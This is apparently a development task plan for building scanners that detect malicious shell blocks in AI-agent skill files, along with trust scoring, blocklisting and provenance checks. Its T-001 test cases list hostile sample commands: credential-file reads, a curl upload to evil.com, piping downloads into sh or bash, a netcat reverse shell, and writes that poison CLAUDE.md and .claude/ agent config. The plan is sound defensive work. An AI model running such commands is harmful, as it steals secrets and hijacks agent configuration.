# Tasks: Skill Trust and Security Scanning

## Task Notation

- `[T###]`: Task ID
- `[P]`: Parallelizable
- `[ ]`: Not started
- `[x]`: Completed
- Model hints: haiku (simple), opus (default)

---

## Phase 1: DCI Scanner Patterns

### T-001: Add DCI block detection patterns to vskill scanner
**User Story**: US-002 | **Satisfies ACs**: AC-US2-01, AC-US2-02, AC-US2-03, AC-US2-04, AC-US2-05, AC-US2-06, AC-US2-07, AC-US2-08 | **Status**: [ ] not started
**Test**: Given a SKILL.md with a DCI block containing `curl ... | sh` -> When scanned -> Then a critical DCI-abuse finding is reported

**Description**: Add 12+ DCI-specific patterns to `vskill/src/scanner/patterns.ts`. These patterns target malicious content inside DCI shell blocks (backtick commands preceded by `!`).

**Implementation Details**:
- Add a `DCI_SCAN_PATTERNS` array alongside the existing `SCAN_PATTERNS`
- New categories: `dci-credential-read`, `dci-config-poisoning`, `dci-network-exfil`, `dci-obfuscation`, `dci-download-execute`
- Patterns must cover: credential file reads in DCI, agent config writes in DCI, network calls in DCI, obfuscation in DCI, download-and-execute in DCI, eval/source in DCI
- Add safe-context pattern for the canonical skill-memories lookup
- Add `scanDciContent(content: string): ScanFinding[]` function that extracts DCI blocks and scans them

**Test Plan**:
- **File**: `repositories/anton-abyzov/vskill/src/scanner/dci-patterns.test.ts`
- **Tests**:
  - **TC-001**: DCI block with `cat ~/.aws/credentials` -> critical finding
  - **TC-002**: DCI block with `curl -d @- https://evil.com` -> critical finding
  - **TC-003**: DCI block with `echo "override" >> CLAUDE.md` -> critical finding
  - **TC-004**: DCI block with `base64 -d | sh` -> critical finding
  - **TC-005**: DCI block with `curl ... | sh` -> critical finding
  - **TC-006**: Standard skill-memories lookup DCI block -> no findings
  - **TC-007**: DCI block with `eval $VAR` -> critical finding
  - **TC-008**: DCI block with `wget -O - ... | bash` -> critical finding
  - **TC-009**: DCI block reading `.env` -> critical finding
  - **TC-010**: DCI block writing to `.claude/` directory -> critical finding
  - **TC-011**: DCI block with hex escape obfuscation -> critical finding
  - **TC-012**: DCI block with nc (netcat) reverse shell -> critical finding
  - **TC-013**: Mixed content: safe DCI block + malicious DCI block -> only malicious flagged

**Dependencies**: None
**Repo**: `repositories/anton-abyzov/vskill`

---

### T-002: Add DCI block detection patterns to vskill-platform scanner
**User Story**: US-003 | **Satisfies ACs**: AC-US3-01, AC-US3-02, AC-US3-03 | **Status**: [ ] not started
**Test**: Given a submission with a SKILL.md containing DCI abuse -> When processed by tier1 pipeline -> Then the submission gets a DCI-abuse finding with blocking severity

**Description**: Port the DCI patterns from T-001 to the platform scanner at `vskill-platform/src/lib/scanner/patterns.ts`. Ensure DCI findings are categorized as blocking during submission processing.

**Implementation Details**:
- Add DCI patterns to the platform scanner pattern list
- Update `process-submission.ts` to treat `dci-*` category findings as blocking (same as critical)
- Add `dci-abuse` as a display category in the admin submission review page

**Test Plan**:
- **File**: `repositories/anton-abyzov/vskill-platform/src/lib/scanner/__tests__/dci-patterns.test.ts`
- **Tests**:
  - **TC-014**: Platform scanner detects DCI credential read pattern
  - **TC-015**: Platform scanner detects DCI config poisoning pattern
  - **TC-016**: Platform scanner does not flag canonical skill-memories DCI
  - **TC-017**: Submission with DCI abuse findings is not auto-approved

**Dependencies**: T-001 (pattern definitions)
**Repo**: `repositories/anton-abyzov/vskill-platform`

---

### T-003: Add DCI block detection patterns to specweave core scanner
**User Story**: US-004 | **Satisfies ACs**: AC-US4-01, AC-US4-02, AC-US4-03 | **Status**: [ ] not started
**Test**: Given a SKILL.md with a DCI block inside a code fence -> When scanned by specweave scanner -> Then the DCI finding retains its original severity (not downgraded to info)

**Description**: Add DCI-specific patterns to `specweave/src/core/fabric/security-scanner.ts`. Critically: DCI findings inside code fences must NOT be downgraded because DCI blocks execute even inside markdown code fences.

**Implementation Details**:
- Add DCI pattern checks to `PATTERN_CHECKS` array
- Override the code-block downgrade logic for DCI-category findings
- Update `scan-skill` CLI command output to include DCI abuse category

**Test Plan**:
- **File**: `repositories/anton-abyzov/specweave/tests/unit/core/fabric/dci-security-scanner.test.ts`
- **Tests**:
  - **TC-018**: DCI credential read detected at critical severity
  - **TC-019**: DCI pattern inside code fence retains original severity (no downgrade)
  - **TC-020**: Standard skill-memories DCI block produces no findings
  - **TC-021**: `scanSkillContent` returns `passed: false` when DCI abuse is detected

**Dependencies**: T-001 (pattern definitions)
**Repo**: `repositories/anton-abyzov/specweave`

---

## Phase 2: Trust Model and Data Layer

### T-004: Prisma schema migration for trust fields
**User Story**: US-001 | **Satisfies ACs**: AC-US1-01 | **Status**: [ ] not started
**Test**: Given the migration is applied -> When querying a Skill record -> Then `trustTier` and `trustScore` fields are accessible with defaults T1 and 0

**Description**: Add trust-related fields to the Prisma schema and create a migration.

**Implementation Details**:
- Add `trustTier String @default("T1")`, `trustScore Int @default(0)`, `provenanceVerified Boolean @default(false)`, `provenanceCheckedAt DateTime?` to `Skill` model
- Add `provenanceVerified Boolean @default(false)`, `provenanceStatus String?`, `contentHashAtScan String?` to `Submission` model
- Add `contentHash String?` to `ScanResult` model
- Generate and apply Prisma migration

**Test Plan**:
- **File**: Manual verification -- migration applies cleanly on dev database
- **Tests**:
  - **TC-022**: Migration creates new columns with correct defaults
  - **TC-023**: Existing Skill records have trustTier="T1" and trustScore=0 after migration

**Dependencies**: None
**Repo**: `repositories/anton-abyzov/vskill-platform`

---

### T-005: Trust score computation engine
**User Story**: US-001 | **Satisfies ACs**: AC-US1-02, AC-US1-03, AC-US1-05 | **Status**: [ ] not started
**Test**: Given a skill with tier1 PASS, tier2 score 85, provenance verified, 200 installs, no reports -> When computing trust score -> Then score is 93 and tier is T4

**Description**: Create `src/lib/trust/trust-score.ts` with the trust score computation algorithm.

**Implementation Details**:
- `computeTrustScore(inputs: TrustScoreInputs): { score: number; tier: TrustTier }`
- Input type: `{ tier1Result?: ScanVerdict; tier2Score?: number; provenanceStatus: 'verified' | 'mismatch' | 'unchecked'; isBlocked: boolean; skillAgeDays: number; installCount: number; unresolvedReports: number; hasBlocklistHistory: boolean; humanReviewed: boolean }`
- Weight components: tier1 (30%), tier2 (30%), provenance (20%), community (20%)
- Blocked skills always return T0 with score 0

**Test Plan**:
- **File**: `repositories/anton-abyzov/vskill-platform/src/lib/trust/__tests__/trust-score.test.ts`
- **Tests**:
  - **TC-024**: Blocked skill -> T0, score 0
  - **TC-025**: No scan results -> T1, score 0
  - **TC-026**: Tier1 PASS only -> T2, score = 30 + community component
  - **TC-027**: Tier1 PASS + tier2 score 85 -> T3, score >= 60
  - **TC-028**: Full verification (all components max) -> T4, score >= 80
  - **TC-029**: Provenance mismatch applies -10 penalty
  - **TC-030**: Tier1 CONCERNS -> 15 points (half credit)
  - **TC-031**: Community component: age >90d=5, installs >100=5, no reports=5, no blocklist history=5
  - **TC-032**: Edge case: tier2 score 0 -> tier2 component = 0

**Dependencies**: T-004
**Repo**: `repositories/anton-abyzov/vskill-platform`

---

### T-006: Trust score persistence and recomputation triggers
**User Story**: US-001 | **Satisfies ACs**: AC-US1-03 | **Status**: [ ] not started
**Test**: Given a skill with T2 trust -> When a tier2 scan result is added with score 90 -> Then trust is recomputed to T3

**Description**: Create `src/lib/trust/trust-updater.ts` that recomputes and persists trust scores when inputs change.

**Implementation Details**:
- `updateSkillTrust(skillId: string): Promise<{ trustTier: string; trustScore: number }>`
- Queries current scan results, blocklist status, provenance, and community signals
- Updates Skill record with new trustTier and trustScore
- Called from: scan result webhook, blocklist add/remove, report resolution, provenance check completion

**Test Plan**:
- **File**: `repositories/anton-abyzov/vskill-platform/src/lib/trust/__tests__/trust-updater.test.ts`
- **Tests**:
  - **TC-033**: Adding scan result triggers recomputation
  - **TC-034**: Blocking a skill sets trust to T0
  - **TC-035**: Unblocking a skill recomputes to correct tier
  - **TC-036**: Provenance verification updates trust score

**Dependencies**: T-005
**Repo**: `repositories/anton-abyzov/vskill-platform`

---

### T-007: API endpoints include trust data
**User Story**: US-001 | **Satisfies ACs**: AC-US1-04 | **Status**: [ ] not started
**Test**: Given a skill with trustTier T3 and trustScore 75 -> When GET /api/v1/skills/:name -> Then response includes `trustTier: "T3"` and `trustScore: 75`

**Description**: Update skill API endpoints to include trust tier and score in responses.

**Implementation Details**:
- Update skill detail endpoint response shape
- Update skill list endpoint to support `?trust=T3` filter
- Update stats endpoint to include trust tier breakdown

**Test Plan**:
- **File**: `repositories/anton-abyzov/vskill-platform/src/app/api/v1/skills/__tests__/trust-response.test.ts`
- **Tests**:
  - **TC-037**: Skill detail response includes trustTier and trustScore
  - **TC-038**: Stats endpoint includes trust tier distribution
  - **TC-039**: Skill list filter by trust tier works correctly

**Dependencies**: T-005
**Repo**: `repositories/anton-abyzov/vskill-platform`

---

## Phase 3: Blocklist Auto-Propagation

### T-008: Auto-create blocklist entry from confirmed security reports
**User Story**: US-005 | **Satisfies ACs**: AC-US5-01, AC-US5-02, AC-US5-03, AC-US5-04 | **Status**: [ ] not started
**Test**: Given a SecurityReport for "evil-skill" resolved as "confirmed_malware" -> When the report resolution is saved -> Then a BlocklistEntry for "evil-skill" exists with severity "critical"

**Description**: Add auto-propagation logic to the SecurityReport resolution flow.

**Implementation Details**:
- In the admin report resolution endpoint (`/api/v1/admin/reports/:id`), detect when `resolutionNote` contains "confirmed_malware" or "confirmed malware"
- Call `prisma.blocklistEntry.upsert()` with skillName from the report
- Map report fields: `reportType` -> `threatType`, `description` -> `reason`, `evidenceUrls` -> `evidenceUrls`
- Set `severity: "critical"`, `discoveredBy: "security-report"`, `addedById: adminId`
- After blocklist entry creation, trigger trust score recomputation for the skill (T0)
- Return confirmation in API response

**Test Plan**:
- **File**: `repositories/anton-abyzov/vskill-platform/src/app/api/v1/admin/reports/[id]/__tests__/auto-blocklist.test.ts`
- **Tests**:
  - **TC-040**: Report resolved as "confirmed_malware" creates BlocklistEntry
  - **TC-041**: Report resolved without "confirmed_malware" does NOT create BlocklistEntry
  - **TC-042**: Duplicate resolution does not create duplicate BlocklistEntry (idempotent)
  - **TC-043**: Created BlocklistEntry has correct fields mapped from report
  - **TC-044**: Skill trust is recomputed to T0 after blocklist entry creation

**Dependencies**: T-006
**Repo**: `repositories/anton-abyzov/vskill-platform`

---

## Phase 4: Provenance and Hash Verification

### T-009: Provenance verification service
**User Story**: US-006 | **Satisfies ACs**: AC-US6-01, AC-US6-02, AC-US6-03 | **Status**: [ ] not started
**Test**: Given a submission from user "owner" for repo "github.com/owner/repo" -> When provenance is checked -> Then provenanceStatus is "verified"

**Description**: Create `src/lib/trust/provenance-verifier.ts` that checks GitHub repo ownership/collaboration.

**Implementation Details**:
- `verifyProvenance(submitterGithub: string, repoUrl: string): Promise<ProvenanceResult>`
- Parse repoUrl to extract owner/repo
- If submitter matches repo owner -> verified
- Otherwise, call GitHub API `GET /repos/{owner}/{repo}/collaborators/{username}` with a service token
- Handle 404 (not collaborator) -> mismatch
- Handle 204 (is collaborator) -> verified
- Store result on Submission record
- Integrate into submission processing pipeline (after tier1 scan, before publish)

**Test Plan**:
- **File**: `repositories/anton-abyzov/vskill-platform/src/lib/trust/__tests__/provenance-verifier.test.ts`
- **Tests**:
  - **TC-045**: Submitter is repo owner -> verified
  - **TC-046**: Submitter is repo collaborator (204 response) -> verified
  - **TC-047**: Submitter is NOT collaborator (404 response) -> mismatch
  - **TC-048**: GitHub API error -> unchecked (graceful degradation)
  - **TC-049**: Invalid repoUrl format -> unchecked with warning

**Dependencies**: T-004
**Repo**: `repositories/anton-abyzov/vskill-platform`

---

### T-010: Content hash recording and tamper detection
**User Story**: US-007 | **Satisfies ACs**: AC-US7-01, AC-US7-02, AC-US7-03, AC-US7-04 | **Status**: [ ] not started
**Test**: Given a skill scanned with content hash "abc123" -> When the content changes to hash "def456" before publish -> Then the submission is moved to RESCAN_REQUIRED state

**Description**: Record content hash at scan time and verify before publishing.

**Implementation Details**:
- In tier1 scan processing: compute SHA-256 of SKILL.md content, store in `ScanResult.contentHash` and `Submission.contentHashAtScan`
- Before publish step: re-fetch SKILL.md from repo, compute hash, compare to stored hash
- If mismatch: move submission to a new `RESCAN_REQUIRED` state, invalidate scan results
- Add `RESCAN_REQUIRED` to `SubmissionState` enum in Prisma schema (from T-004)
- Admin UI: show tamper warning badge on submissions with hash mismatch

**Test Plan**:
- **File**: `repositories/anton-abyzov/vskill-platform/src/lib/trust/__tests__/content-hash.test.ts`
- **Tests**:
  - **TC-050**: Content hash is recorded during scan
  - **TC-051**: Matching hash at publish time -> proceeds normally
  - **TC-052**: Mismatched hash at publish time -> RESCAN_REQUIRED state
  - **TC-053**: RESCAN_REQUIRED submission cannot be published

**Dependencies**: T-004
**Repo**: `repositories/anton-abyzov/vskill-platform`

---

## Phase 5: CLI and UI Integration

### T-011: Trust tier display in vskill CLI
**User Story**: US-008 | **Satisfies ACs**: AC-US8-01, AC-US8-02, AC-US8-03, AC-US8-04 | **Status**: [ ] not started
**Test**: Given a skill with trustTier T3 -> When running `vskill add my-skill` -> Then output includes "Trust: T3 (Verified)"

**Description**: Display trust information in vskill CLI commands.

**Implementation Details**:
- Update `vskill add` to fetch and display trust tier + score from platform API
- T0: Red warning + require `--force` flag
- T1: Amber warning about unverified status
- T2-T4: Green display with tier label
- Update `vskill info` to show trust details section

**Test Plan**:
- **File**: `repositories/anton-abyzov/vskill/src/commands/add.test.ts` (extend existing)
- **Tests**:
  - **TC-054**: T0 skill shows red warning and blocks without --force
  - **TC-055**: T1 skill shows amber unverified warning
  - **TC-056**: T3 skill shows green verified display
  - **TC-057**: `vskill info` includes trust tier and score

**Dependencies**: T-007
**Repo**: `repositories/anton-abyzov/vskill`

---

### T-012: Trust tier display in platform UI
**User Story**: US-009 | **Satisfies ACs**: AC-US9-01, AC-US9-02, AC-US9-03 | **Status**: [ ] not started
**Test**: Given the Trust Center page -> When loaded -> Then trust tier distribution chart shows counts per T0-T4

**Description**: Add trust tier visualization to the platform web UI.

**Implementation Details**:
- Update `/trust` page to show trust tier distribution (reuse existing chart components)
- Add trust badge component: `<TrustBadge tier="T3" score={85} />`
- Display trust badge on skill detail pages alongside existing cert badge
- Update stats endpoint consumer to display trust breakdown

**Test Plan**:
- **File**: `repositories/anton-abyzov/vskill-platform/src/app/trust/__tests__/TrustTierDisplay.test.tsx`
- **Tests**:
  - **TC-058**: Trust Center shows tier distribution
  - **TC-059**: TrustBadge renders correct tier label and color
  - **TC-060**: Skill detail page shows trust badge

**Dependencies**: T-007
**Repo**: `repositories/anton-abyzov/vskill-platform`

---

### T-013: Trust score migration for existing skills
**User Story**: US-001 | **Satisfies ACs**: AC-US1-01 | **Status**: [ ] not started
**Test**: Given 100 existing skills with various scan results -> When migration script runs -> Then each skill has correct trustTier and trustScore based on existing data

**Description**: Write a migration script that computes trust scores for all existing skills.

**Implementation Details**:
- Batch process skills in chunks of 100
- For each skill: query scan results, blocklist status, compute trust score
- Update Skill record with computed trustTier and trustScore
- Log migration progress and results

**Test Plan**:
- **File**: `repositories/anton-abyzov/vskill-platform/scripts/__tests__/trust-migration.test.ts`
- **Tests**:
  - **TC-061**: Skills with no scan results get T1
  - **TC-062**: Skills with passing tier1 get T2
  - **TC-063**: Skills with passing tier2 get T3
  - **TC-064**: Blocked skills get T0

**Dependencies**: T-005, T-006
**Repo**: `repositories/anton-abyzov/vskill-platform`

---

## Phase 6: Verification

### T-014: Integration test -- end-to-end DCI scanning
**User Story**: US-002, US-003, US-004 | **Satisfies ACs**: All DCI ACs | **Status**: [ ] not started
**Test**: Given a SKILL.md with mixed safe and malicious DCI blocks -> When scanned by all three scanners -> Then consistent findings across all repos

**Description**: Cross-repo integration test verifying DCI pattern consistency.

**Implementation Details**:
- Create a test fixture SKILL.md with: 1 safe DCI block (skill-memories), 1 malicious DCI block (credential read), 1 malicious DCI block (config poison)
- Run vskill scanner, platform scanner, and specweave scanner against the same fixture
- Verify all three produce equivalent findings

**Test Plan**:
- **File**: Integration test (manual verification with documented procedure)
- **Tests**:
  - **TC-065**: All three scanners detect credential read DCI abuse
  - **TC-066**: All three scanners allow safe skill-memories DCI
  - **TC-067**: All three scanners detect config poisoning DCI abuse

**Dependencies**: T-001, T-002, T-003

---

### T-015: Integration test -- trust score recomputation flow
**User Story**: US-001 | **Satisfies ACs**: AC-US1-03 | **Status**: [ ] not started
**Test**: Given a skill at T2 -> When a tier2 scan result is added via webhook -> Then trust is recomputed to T3

**Description**: End-to-end test of trust score recomputation through API calls.

**Implementation Details**:
- Create skill via test setup with tier1 results (T2)
- POST scan results via webhook (simulating tier2 pass with score 85)
- Verify skill trustTier updated to T3 and trustScore recalculated

**Test Plan**:
- **File**: `repositories/anton-abyzov/vskill-platform/src/lib/trust/__tests__/trust-flow.test.ts`
- **Tests**:
  - **TC-068**: Scan result webhook triggers trust recomputation
  - **TC-069**: Blocklist add sets trust to T0
  - **TC-070**: Blocklist remove recomputes to appropriate tier

**Dependencies**: T-006, T-007
**Repo**: `repositories/anton-abyzov/vskill-platform`
